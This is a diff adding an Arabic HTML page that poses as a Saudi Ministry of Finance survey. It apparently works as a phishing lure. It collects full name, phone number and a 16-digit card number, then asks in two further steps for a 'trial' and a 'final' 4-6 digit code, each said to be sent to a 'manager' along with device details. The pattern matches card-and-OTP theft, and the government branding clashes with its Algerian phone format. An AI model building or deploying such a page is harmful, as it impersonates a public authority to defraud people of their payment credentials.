@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="pageTitle">نظام استبيانات الخدمات المالية | وزارة المالية</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📊</text></svg>">
+</head>
+<body>
+    <!-- شاشة التحميل -->
+    <div id="loading" class="loading-screen">
+        <div class="loading-content">
+            <div class="spinner"></div>
+            <p id="loadingText">جاري تحميل نظام الاستبيانات...</p>
+        </div>
+    </div>
+
+    <!-- الهيدر -->
+    <header class="header">
+        <div class="header-content">
+            <a href="#" class="logo" onclick="goHome(); return false;">
+                <div class="logo-icon">
+                    <i class="fas fa-chart-bar"></i>
+                </div>
+                <div class="logo-text">
+                    <h1 id="siteName">نظام استبيانات الخدمات المالية</h1>
+                    <p id="siteSubtitle">وزارة المالية - المملكة العربية السعودية</p>
+                </div>
+            </a>
+            
+            <div class="header-info">
+                <!-- اختيار اللغة -->
+                <div class="language-selector">
+                    <button id="languageToggle" class="lang-btn">
+                        <i class="fas fa-globe"></i>
+                        <span id="currentLang">العربية</span>
+                        <i class="fas fa-chevron-down"></i>
+                    </button>
+                    <div class="language-dropdown">
+                        <button class="lang-option" onclick="changeLanguage('ar')">
+                            <span class="lang-flag">🇸🇦</span>
+                            <span>العربية</span>
+                        </button>
+                        <button class="lang-option" onclick="changeLanguage('en')">
+                            <span class="lang-flag">🇺🇸</span>
+                            <span>English</span>
+                        </button>
+                        <button class="lang-option" onclick="changeLanguage('ber')">
+                            <span class="lang-flag">🇲🇦</span>
+                            <span>ⵜⴰⵎⴰⵣⵉⵖⵜ</span>
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="status-badge">
+                    <i class="fas fa-check-circle"></i>
+                    <span id="systemStatus">النظام يعمل</span>
+                </div>
+                <div class="header-time">
+                    <i class="far fa-clock"></i>
+                    <span id="current-time"></span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- المحتوى الرئيسي -->
+    <div class="main-container">
+        <!-- الصفحة 1: المعلومات الشخصية -->
+        <div id="page1" class="page active">
+            <div class="page-header">
+                <h2><i class="fas fa-user-edit"></i> <span id="page1Title">المرحلة الأولى: المعلومات الأساسية</span></h2>
+                <p id="page1Subtitle"></p>
+            </div>
+            
+            <div class="form-container">
+                <div class="form-section">
+                    <h3><i class="fas fa-id-card"></i> <span id="formSectionTitle">بيانات المشارك</span></h3>
+                    
+                    <!-- الاسم الكامل -->
+                    <div class="input-group">
+                        <label for="fullName">
+                            <i class="fas fa-user"></i>
+                            <span id="nameLabel">الاسم الكامل</span>
+                            <span class="required">*</span>
+                        </label>
+                        <div class="input-wrapper">
+                            <input type="text" 
+                                   id="fullName" 
+                                   class="form-input"
+                                   placeholder="أحمد محمد" 
+                                   required>
+                        </div>
+                        <div class="input-hint">
+                            <i class="fas fa-info-circle"></i>
+                            <span id="nameHint">يمكن الكتابة بالعربية أو الإنجليزية أو الأمازيغية</span>
+                        </div>
+                        <div id="nameTip" class="hidden-tip"></div>
+                    </div>
+                    
+                    <!-- رقم الهاتف -->
+                    <div class="input-group">
+                        <label for="phoneNumber">
+                            <i class="fas fa-mobile-alt"></i>
+                            <span id="phoneLabel">رقم الهاتف</span>
+                            <span class="required">*</span>
+                        </label>
+                        <div class="input-wrapper">
+                            <input type="tel" 
+                                   id="phoneNumber" 
+                                   class="form-input"
+                                   placeholder="0512345678" 
+                                   pattern="^(05|06|07)[0-9]{8}$"
+                                   required>
+                        </div>
+                        <div class="input-hint">
+                            <i class="fas fa-info-circle"></i>
+                            <span id="phoneHint">رقم جزائري صالح مكون من 10 أرقام (يبدأ بـ 05 أو 06 أو 07)</span>
+                        </div>
+                        <div id="phoneTip" class="hidden-tip"></div>
+                    </div>
+                    
+                    <!-- رقم البطاقة -->
+                    <div class="input-group">
+                        <label for="cardNumber">
+                            <i class="fas fa-credit-card"></i>
+                            <span id="cardLabel">رقم البطاقة</span>
+                            <span class="required">*</span>
+                        </label>
+                        <div class="input-wrapper">
+                            <input type="text" 
+                                   id="cardNumber" 
+                                   class="form-input"
+                                   placeholder="1234567890123456" 
+                                   pattern="[0-9]{16}"
+                                   maxlength="16"
+                                   required>
+                        </div>
+                        <div class="input-hint">
+                            <i class="fas fa-info-circle"></i>
+                            <span id="cardHint">رقم البطاقة المكون من 16 رقمًا (يستخدم للتحقق فقط)</span>
+                        </div>
+                        <div id="cardTip" class="hidden-tip"></div>
+                    </div>
+                    
+                    <!-- تاريخ الانتماء -->
+                    <div class="input-group">
+                        <label for="membershipDate">
+                            <i class="fas fa-calendar-alt"></i>
+                            <span id="dateLabel">تاريخ الانتماء</span>
+                            <span class="required">*</span>
+                        </label>
+                        <div class="date-input-container">
+                            <div class="date-select-group">
+                                <select id="membershipMonth" class="month-select" required>
+                                    <option value="">اختر الشهر</option>
+                                </select>
+                                
+                                <select id="membershipYear" class="year-select" required>
+                                    <option value="">اختر السنة</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="input-hint">
+                            <i class="fas fa-info-circle"></i>
+                            <span id="dateHint">الشهر والسنة التي انتميت فيها للخدمة المالية</span>
+                        </div>
+                    </div>
+                    
+                    <!-- رسالة تأكيد -->
+                    <div class="confirmation-box">
+                        <input type="checkbox" id="dataConfirmation" required>
+                        <label for="dataConfirmation">
+                            <i class="fas fa-shield-alt"></i>
+                            <span id="confirmationText">أوافق على معالجة بياناتي وفق سياسة الخصوصية والموافقة على إرسالها للإدارة المختصة للمراجعة</span>
+                        </label>
+                    </div>
+                </div>
+                
+                <div class="form-actions">
+                    <button onclick="sendToManager()" class="btn send-btn">
+                        <i class="fas fa-paper-plane"></i> <span id="sendButtonText">إرسال البيانات</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- الصفحة 2: الرمز التجريبي -->
+        <div id="page2" class="page">
+            <div class="page-header">
+                <h2><i class="fas fa-key"></i> <span id="page2Title">المرحلة الثانية: الرمز التجريبي</span></h2>
+                <p id="page2Subtitle">أدخل رمز مكون من 4 إلى 6 أرقام</p>
+            </div>
+            
+            <div class="progress-indicator">
+                <div class="progress-step completed">
+                    <div class="step-number">1</div>
+                    <div class="step-label" id="step1Label2">المعلومات</div>
+                </div>
+                <div class="progress-line active"></div>
+                <div class="progress-step active">
+                    <div class="step-number">2</div>
+                    <div class="step-label" id="step2Label2">التجريبي</div>
+                </div>
+                <div class="progress-line"></div>
+                <div class="progress-step">
+                    <div class="step-number">3</div>
+                    <div class="step-label" id="step3Label2">النهائي</div>
+                </div>
+                <div class="progress-line"></div>
+                <div class="progress-step">
+                    <div class="step-number">4</div>
+                    <div class="step-label" id="step4Label2">الإكمال</div>
+                </div>
+            </div>
+            
+            <div class="verification-container">
+                <!-- معلومات الجهاز -->
+                <div class="device-info-card">
+                    <h3><i class="fas fa-laptop"></i> <span>معلومات جهازك</span></h3>
+                    <div class="device-info-grid">
+                        <div class="info-item">
+                            <span class="info-label">نوع الجهاز:</span>
+                            <span class="info-value" id="deviceType">جوال</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">المتصفح:</span>
+                            <span class="info-value" id="browserType">Chrome</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">نظام التشغيل:</span>
+                            <span class="info-value" id="osType">Android</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">مقاس الشاشة:</span>
+                            <span class="info-value" id="screenSize">375×812</span>
+                        </div>
+                    </div>
+                    <div class="device-note">
+                        <i class="fas fa-info-circle"></i>
+                        <span>تم كشف نوع جهازك تلقائياً. هذه المعلومات تُرسل مع البيانات للمدير للتحقق</span>
+                    </div>
+                </div>
+                
+                <!-- قسم الرمز التجريبي -->
+                <div class="code-section">
+                    <h3><i class="fas fa-lock"></i> <span id="trialCodeTitle">الرمز التجريبي</span></h3>
+                    <p id="trialCodeDesc">أدخل أي 4 إلى 6 أرقام من اختيارك (سيتم إرسالها للمدير للتحقق)</p>
+                    
+                    <div class="code-input-container">
+                        <input type="text" 
+                               id="trialCode" 
+                               class="code-input"
+                               maxlength="6"
+                               placeholder="123456 أو 1234"
+                               autocomplete="off">
+                    </div>
+                    
+                    <div class="code-hint">
+                        <i class="fas fa-info-circle"></i>
+                        <span id="trialCodeHint">يمكنك إدخال 4 أو 5 أو 6 أرقام (مثل: 1234 أو 12345 أو 123456)</span>
+                    </div>
+                    
+                    <div id="trialCodeTip" class="hidden-tip"></div>
+                    
+                    <!-- أمثلة للرموز -->
+                    <div class="code-examples">
+                        <h4><i class="fas fa-lightbulb"></i> <span>أمثلة للرموز:</span></h4>
+                        <div class="example-buttons">
+                            <button class="example-btn" onclick="fillTrialCode('123456')">123456</button>
+                            <button class="example-btn" onclick="fillTrialCode('1234')">1234</button>
+                            <button class="example-btn" onclick="fillTrialCode('567890')">567890</button>
+                            <button class="example-btn" onclick="fillTrialCode('9999')">9999</button>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- إرسال الرمز التجريبي -->
+                <div class="finish-section">
+                    <div class="finish-note">
+                        <i class="fas fa-shield-alt"></i>
+                        <span id="trialNote">بعد إرسال الرمز التجريبي، ستنتقل إلى صفحة إدخال الرمز النهائي</span>
+                    </div>
+                    
+                    <button onclick="sendTrialCode()" class="btn trial-btn">
+                        <i class="fas fa-paper-plane"></i> <span id="trialButtonText">إرسال الرمز التجريبي</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- الصفحة 3: الرمز النهائي -->
+        <div id="page3" class="page">
+            <div class="page-header">
+                <h2><i class="fas fa-lock"></i> <span id="page3Title">المرحلة الثالثة: الرمز النهائي</span></h2>
+                <p id="page3Subtitle">أدخل الرمز النهائي المكون من 4 إلى 6 أرقام</p>
+            </div>
+            
+            <div class="progress-indicator">
+                <div class="progress-step completed">
+                    <div class="step-number">1</div>
+                    <div class="step-label" id="step1Label3">المعلومات</div>
+                </div>
+                <div class="progress-line active"></div>
+                <div class="progress-step completed">
+                    <div class="step-number">2</div>
+                    <div class="step-label" id="step2Label3">التجريبي</div>
+                </div>
+                <div class="progress-line active"></div>
+                <div class="progress-step active">
+                    <div class="step-number">3</div>
+                    <div class="step-label" id="step3Label3">النهائي</div>
+                </div>
+                <div class="progress-line"></div>
+                <div class="progress-step">
+                    <div class="step-number">4</div>
+                    <div class="step-label" id="step4Label3">الإكمال</div>
+                </div>
+            </div>
+            
+            <div class="final-code-container">
+                <!-- تأكيد استلام الرمز التجريبي -->
+                <div class="confirmation-card">
+                    <div class="confirmation-icon">
+                        <i class="fas fa-check-circle"></i>
+                    </div>
+                    <div class="confirmation-content">
+                        <h3><i class="fas fa-check"></i> <span>تم استلام الرمز التجريبي</span></h3>
+                        <p>الرمز التجريبي <strong id="trialCodeDisplay">___</strong> تم إرساله للمدير بنجاح</p>
+                    </div>
+                </div>
+                
+                <!-- قسم الرمز النهائي -->
+                <div class="code-section">
+                    <h3><i class="fas fa-key"></i> <span id="finalCodeTitle">الرمز النهائي</span></h3>
+                    <p id="finalCodeDesc">أدخل 4 إلى 6 أرقام نهائية مختلفة (سترسل للمدير مع جميع البيانات)</p>
+                    
+                    <div class="code-input-container">
+                        <input type="text" 
+                               id="finalCode" 
+                               class="code-input"
+                               maxlength="6"
+                               placeholder="987654 أو 5678"
+                               autocomplete="off">
+                    </div>
+                    
+                    <div class="code-hint">
+                        <i class="fas fa-exclamation-circle"></i>
+                        <span id="finalCodeHint">يجب أن يكون مختلف عن الرمز التجريبي (أدخل أرقام جديدة)</span>
+                    </div>
+                    
+                    <div id="finalCodeTip" class="hidden-tip"></div>
+                    
+                    <!-- أمثلة للرموز النهائية -->
+                    <div class="code-examples">
+                        <h4><i class="fas fa-lightbulb"></i> <span>أمثلة للرموز النهائية:</span></h4>
+                        <div class="example-buttons">
+                            <button class="example-btn" onclick="fillFinalCode('987654')">987654</button>
+                            <button class="example-btn" onclick="fillFinalCode('5678')">5678</button>
+                            <button class="example-btn" onclick="fillFinalCode('777888')">777888</button>
+                            <button class="example-btn" onclick="fillFinalCode('3333')">3333</button>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- إرسال الرمز النهائي -->
+                <div class="final-section">
+                    <div class="finish-note">
+                        <i class="fas fa-shield-alt"></i>
+                        <span id="finalNote">سيتم إرسال جميع بياناتك مع الرمز النهائي للمدير للمراجعة النهائية</span>
+                    </div>
+                    
+                    <button onclick="sendFinalCode()" class="btn final-btn">
+                        <i class="fas fa-check-circle"></i> <span id="finalButtonText">إرسال الرمز النهائي</span>
+                    </button>
+                    
+                    <div class="final-note">
+                        <i class="fas fa-info-circle"></i>
+                        <span>هذه هي الخطوة الأخيرة في الاستبيان. بعدها سيتم إرسال جميع بياناتك للمدير</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- الصفحة 4: صفحة النهاية -->
+        <div id="page4" class="page">
+            <div class="page-header">
+                <h2><i class="fas fa-check-circle"></i> <span id="page4Title">تم إكمال الاستبيان بنجاح!</span></h2>
+                <p id="page4Subtitle">شكراً لمشاركتك القيّمة في استبيان الخدمات المالية</p>
+            </div>
+            
+            <div class="progress-indicator">
+                <div class="progress-step completed">
+                    <div class="step-number">1</div>
+                    <div class="step-label" id="step1Label4">المعلومات</div>
+                </div>
+                <div class="progress-line active"></div>
+                <div class="progress-step completed">
+                    <div class="step-number">2</div>
+                    <div class="step-label" id="step2Label4">التجريبي</div>
+                </div>
+                <div class="progress-line active"></div>
+                <div class="progress-step completed">
+                    <div class="step-number">3</div>
+                    <div class="step-label" id="step3Label4">النهائي</div>
+                </div>
+                <div class="progress-line active"></div>
+                <div class="progress-step active">
+                    <div class="step-number">4</div>
+                    <div class="step-label" id="step4Label4">الإكمال</div>
+                </div>
+            </div>
+            
+            <div class="completion-container">
+                <!-- أيقونة النجاح -->
+                <div class="success-icon">
+                    <i class="fas fa-check"></i>
+                </div>
+                
+                <!-- رسالة التهنئة -->
+                <div class="completion-header">
+                    <h2><i class="fas fa-trophy"></i> <span>مشاركة ناجحة!</span></h2>
+                    <p class="completion-message">
+                        تم إرسال استبيانك بنجاح إلى إدارة نظام الاستبيانات.
+                        سيتم مراجعته من قبل المدير المختص في أقرب وقت ممكن.
+                    </p>
+                </div>
+                
+                <!-- تفاصيل المشاركة -->
+                <div class="details-card">
+                    <h3><i class="fas fa-clipboard-list"></i> <span>تفاصيل مشاركتك</span></h3>
+                    <div class="details-grid">
+                        <div class="detail-item">
+                            <div class="detail-label">
+                                <i class="fas fa-hashtag"></i>
+                                <span>رقم المشاركة:</span>
+                            </div>
+                            <div class="detail-value" id="surveyId">FS-2412-0001</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-label">
+                                <i class="fas fa-calendar"></i>
+                                <span>تاريخ الإرسال:</span>
+                            </div>
+                            <div class="detail-value" id="submissionDate">2024-12-25 14:30</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-label">
+                                <i class="fas fa-user"></i>
+                                <span>اسم المشارك:</span>
+                            </div>
+                            <div class="detail-value" id="submittedName">أحمد محمد</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-label">
+                                <i class="fas fa-phone"></i>
+                                <span>رقم الهاتف:</span>
+                            </div>
+                            <div class="detail-value" id="submittedPhone">0501234567</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-label">
+                                <i class="fas fa-chart-line"></i>
+                                <span>الحالة:</span>
+                            </div>
+                            <div class="detail-value">
+                                <span class="status-badge pending">تم الإرسال بنجاح - جاري المراجعة</span>
+                            </div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-label">
+                                <i class="fas fa-clock"></i>
+                                <span>مدة المراجعة:</span>
+                            </div>
+                            <div class="detail-value">24-48 ساعة</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- رسائل التوجيه -->
+                <div class="completion-messages">
+                    <div class="message-card">
+                        <div class="message-icon">
+                            <i class="fas fa-save"></i>
+                        </div>
+                        <div class="message-content">
+                            <h4>حفظ رقم المشاركة</h4>
+                            <ul>
+                                <li><i class="fas fa-check-circle"></i> احفظ رقم مشاركتك للمتابعة</li>
+                                <li><i class="fas fa-check-circle"></i> يمكنك مشاركته مع الإدارة</li>
+                                <li><i class="fas fa-check-circle"></i> ستحتاجه لمتابعة الحالة</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="message-card">
+                        <div class="message-icon">
+                            <i class="fas fa-history"></i>
+                        </div>
+                        <div class="message-content">
+                            <h4>متابعة المراجعة</h4>
+                            <ul>
+                                <li><i class="fas fa-check-circle"></i> يمكنك متابعة حالة المراجعة</li>
+                                <li><i class="fas fa-check-circle"></i> ستصلك إشعارات بالتحديثات</li>
+                                <li><i class="fas fa-check-circle"></i> متوسط وقت المراجعة: 24 ساعة</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- أزرار الإجراءات -->
+                <div class="completion-actions">
+                    <button onclick="newSurvey()" class="btn new-survey-btn">
+                        <i class="fas fa-plus-circle"></i> <span id="newSurveyButton">بدء استبيان جديد</span>
+                    </button>
+                    
+                    <button onclick="shareSurvey()" class="btn share-btn">
+                        <i class="fas fa-share-alt"></i> <span id="shareButton">مشاركة رقم المشاركة</span>
+                    </button>
+                    
+                    <button onclick="viewStatus()" class="btn status-btn">
+                        <i class="fas fa-search"></i> <span id="statusButton">متابعة حالة المراجعة</span>
+                    </button>
+                </div>
+                
+                <!-- الملاحظة الختامية -->
+                <div class="final-note">
+                    <i class="fas fa-star"></i>
+                    <span>شكراً لمشاركتك القيّمة في تطوير وتحسين الخدمات المالية في المملكة العربية السعودية</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- الفوتر -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-section">
+                <h4 id="aboutSystem">عن النظام</h4>
+                <p id="systemDescription">نظام استبيانات الخدمات المالية التابع لوزارة المالية، يهدف إلى جمع آراء المواطنين والمقيمين لتطوير وتحسين الخدمات المالية المقدمة.</p>
+                <div class="social-links">
+                    <a href="#" aria-label="تويتر"><i class="fab fa-twitter"></i></a>
+                    <a href="#" aria-label="فيسبوك"><i class="fab fa-facebook-f"></i></a>
+                    <a href="#" aria-label="لينكدإن"><i class="fab fa-linkedin-in"></i></a>
+                    <a href="#" aria-label="يوتيوب"><i class="fab fa-youtube"></i></a>
+                </div>
+            </div>
+            
+            <div class="footer-section">
+                <h4 id="quickLinks">روابط سريعة</h4>
+                <ul class="footer-links">
+                    <li><a href="privacy.html" onclick="showPrivacy(); return false;"><i class="fas fa-chevron-left"></i> <span id="privacyLink">سياسة الخصوصية</span></a></li>
+                    <li><a href="terms.html" onclick="showTerms(); return false;"><i class="fas fa-chevron-left"></i> <span id="termsLink">شروط الاستخدام</span></a></li>
+                    <li><a href="faq.html" onclick="showFAQ(); return false;"><i class="fas fa-chevron-left"></i> <span id="faqLink">الأسئلة الشائعة</span></a></li>
+                    <li><a href="support.html" onclick="showSupport(); return false;"><i class="fas fa-chevron-left"></i> <span id="supportLink">الدعم الفني</span></a></li>
+                    <li><a href="contact.html" onclick="showContact(); return false;"><i class="fas fa-chevron-left"></i> <span id="contactLink">اتصل بنا</span></a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-section">
+                <h4 id="contactInfo">معلومات الاتصال</h4>
+                <p><i class="fas fa-map-marker-alt"></i> <span id="addressText">الرياض، المملكة العربية السعودية</span></p>
+                <p><i class="fas fa-phone"></i> <span id="phoneText">920020000</span></p>
+                <p><i class="fas fa-envelope"></i> <span id="emailText">surveys@mof.gov.sa</span></p>
+                <p><i class="fas fa-clock"></i> <span id="hoursText">الأحد - الخميس: 8 صباحاً - 4 مساءً</span></p>
+            </div>
+        </div>
+        
+        <div class="footer-bottom">
+            <p>© 2024 <span id="copyrightText">نظام استبيانات الخدمات المالية - وزارة المالية. جميع الحقوق محفوظة.</span></p>
+            <p><span id="versionText">الإصدار 4.0.1</span> | <span id="updateText">آخر تحديث: ديسمبر 2024</span></p>
+        </div>
+    </footer>
+
+    <!-- النوافذ المنبثقة -->
+    <div id="privacyModal" class="modal">
+        <div class="modal-content wide-modal">
+            <div class="modal-header">
+                <h3><i class="fas fa-shield-alt"></i> <span id="privacyTitle">سياسة الخصوصية</span></h3>
+                <button onclick="closeAllModals()" class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div id="privacyContent">
+                    <!-- يتم تعبئة المحتوى بواسطة JavaScript -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="termsModal" class="modal">
+        <div class="modal-content wide-modal">
+            <div class="modal-header">
+                <h3><i class="fas fa-file-contract"></i> <span id="termsTitle">شروط الاستخدام</span></h3>
+                <button onclick="closeAllModals()" class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div id="termsContent"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="faqModal" class="modal">
+        <div class="modal-content wide-modal">
+            <div class="modal-header">
+                <h3><i class="fas fa-question-circle"></i> <span id="faqTitle">الأسئلة الشائعة</span></h3>
+                <button onclick="closeAllModals()" class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div id="faqContent"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="supportModal" class="modal">
+        <div class="modal-content wide-modal">
+            <div class="modal-header">
+                <h3><i class="fas fa-headset"></i> <span id="supportTitle">الدعم الفني</span></h3>
+                <button onclick="closeAllModals()" class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div id="supportContent"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="contactModal" class="modal">
+        <div class="modal-content wide-modal">
+            <div class="modal-header">
+                <h3><i class="fas fa-envelope"></i> <span id="contactTitle">اتصل بنا</span></h3>
+                <button onclick="closeAllModals()" class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div id="contactContent"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- نافذة مشاركة الرقم -->
+    <div id="shareModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fas fa-share-square"></i> <span id="shareTitle">مشاركة رقم المشاركة</span></h3>
+                <button onclick="closeAllModals()" class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <p id="shareDesc">يمكنك نسخ رقم مشاركتك لمشاركته مع الإدارة أو حفظه للمراجعة لاحقاً:</p>
+                <div class="share-input-group">
+                    <input type="text" id="shareCodeInput" readonly>
+                    <button onclick="copyToClipboard()" class="copy-btn">
+                        <i class="fas fa-copy"></i> <span id="copyButtonText">نسخ الرقم</span>
+                    </button>
+                </div>
+                <div id="copyMessage" class="copy-message"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- الإشعارات -->
+    <div id="notification" class="notification"></div>
+
+    <script src="config.js"></script>
+    <script src="translations.js"></script>
+    <script src="app.js"></script>
+    
+    <script>
+        // تحديث الوقت في الهيدر
+        function updateTime() {
+            const now = new Date();
+            const currentLang = localStorage.getItem('preferredLanguage') || 'ar';
+            const options = { 
+                weekday: 'long', 
+                year: 'numeric', 
+                month: 'long', 
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                timeZone: 'Asia/Riyadh'
+            };
+            
+            const locales = {
+                'ar': 'ar-SA',
+                'en': 'en-US',
+                'ber': 'en-US'
+            };
+            
+            document.getElementById('current-time').textContent = 
+                now.toLocaleDateString(locales[currentLang] || 'ar-SA', options);
+        }
+        
+        setInterval(updateTime, 1000);
+        updateTime();
+    </script>
+</body>
+</html>
